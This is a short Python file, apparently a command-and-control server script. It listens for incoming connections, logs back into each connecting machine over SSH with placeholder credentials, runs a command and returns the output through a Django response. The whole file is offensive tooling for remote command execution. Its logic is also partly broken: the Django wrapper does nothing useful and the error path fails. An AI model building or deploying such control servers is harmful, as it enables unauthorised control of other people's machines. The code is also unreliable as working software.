# command_and_control.py

import socket
import paramiko
from django.http import HttpResponse

# Define a class to represent the C2 server
class C2Server:
    def __init__(self, ip, port, username, password):
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password
        self.server = None
        self.ssh = paramiko.SSHClient()

    def setup_c2(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.ip, self.port))
        self.server.listen(1)
        print("[+] Listening for incoming connections...")

    def send_command(self, command):
        client, addr = self.server.accept()
        print("[+] Accepted connection from: {} : {}".format(addr[0], addr[1]))

        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            self.ssh.connect(addr[0], username=self.username, password=self.password)
            stdin, stdout, stderr = self.ssh.exec_command(command)
            output = stdout.read().decode('utf-8')
            print("[+] Command executed, output:")
            print(output)
            return output
        except paramiko.AuthenticationException:
            print("[-] Failed to authenticate SSH session...")

        client.close()

    def close_c2(self):
        self.server.close()
        self.ssh.close()

def command_and_control():
    c2 = C2Server('0.0.0.0', 9999, 'username', 'password')  # Replace with your IP, port, username and password
    c2.setup_c2()
    command_output = c2.send_command("ls")
    c2.close_c2()
    return HttpResponse("Command output: " + command_output)
